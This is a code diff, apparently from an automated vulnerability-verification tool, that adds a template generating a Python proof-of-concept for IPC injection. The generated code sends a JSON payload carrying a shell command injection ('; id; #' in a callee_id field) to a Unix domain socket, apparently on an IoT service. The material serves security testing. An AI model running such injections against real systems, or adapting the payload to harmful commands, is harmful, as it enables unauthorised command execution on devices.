@@ -980,3 +980,96 @@ register_template(
         generate=_generate_memory_stateful_probe,
     )
 )
+
+def _generate_ipc_injection(ctx: PoCContext) -> str:
+    chain_literal = json.dumps(ctx.chain_id)
+    service_literal = json.dumps(ctx.target_service)
+    candidate_literal = json.dumps(ctx.candidate_id)
+    summary_literal = json.dumps(ctx.candidate_summary)
+    channels_literal = repr(ctx.channels or [])
+    return textwrap.dedent(
+        f"""\
+        from __future__ import annotations
+
+        import socket
+        import json
+        import os
+        from datetime import datetime, timezone
+
+
+        class PoCResult:
+            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
+                self.success = success
+                self.proof_type = proof_type
+                self.proof_evidence = proof_evidence
+                self.timestamp = timestamp
+
+
+        def _utc_now() -> str:
+            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")
+
+
+        class PoC:
+            chain_id = {chain_literal}
+            target_service = {service_literal}
+            _CHANNELS = {channels_literal}
+
+            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
+                self.target_ip = target_ip
+                self.target_port = target_port
+                self.context = context
+
+            def execute(self) -> PoCResult:
+                timestamp = _utc_now()
+                socket_path = "/var/run/mastiff_ipc_socket"
+                for channel in self._CHANNELS:
+                    if isinstance(channel, dict) and str(channel.get("channel_type")) == "ipc":
+                        target = str(channel.get("target", "")).strip()
+                        if target and target.startswith("/"):
+                            socket_path = target
+                            break
+
+                # POC Payload: Trigger Event 2 (aae_tunnel_test) with command injection in callee_id
+                payload = {{"awsiot": {{"eid": 2, "callee_id": "'; id; #"}} }}
+                payload_str = json.dumps(payload)
+                
+                evidence_prefix = (
+                    "autopoc_mode=deterministic_nonweaponized "
+                    + "candidate_id="
+                    + {candidate_literal}
+                    + " summary="
+                    + {summary_literal}
+                    + " probe=ipc_injection"
+                )
+
+                try:
+                    if not os.path.exists(socket_path):
+                         return PoCResult(False, "vulnerability_trigger", evidence_prefix + f" result=socket_not_found path={{socket_path}}", timestamp)
+                    
+                    client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                    client.connect(socket_path)
+                    client.sendall(payload_str.encode())
+                    client.close()
+                    
+                    return PoCResult(True, "vulnerability_trigger", evidence_prefix + f" result=ipc_sent path={{socket_path}} payload={{payload_str}}", timestamp)
+                except Exception as exc:
+                    return PoCResult(False, "vulnerability_trigger", evidence_prefix + f" result=error error={{type(exc).__name__}}:{{exc}}", timestamp)
+
+            def cleanup(self) -> None:
+                return
+        """
+    )
+
+register_template(
+    PoCTemplate(
+        vuln_type="ipc_injection",
+        families=frozenset({
+            "ipc_injection",
+            "cross_binary_taint",
+            "socket_injection",
+            "mastiff_ipc_risk",
+        }),
+        description="Unix Domain Socket IPC injection probe",
+        generate=_generate_ipc_injection,
+    )
+)
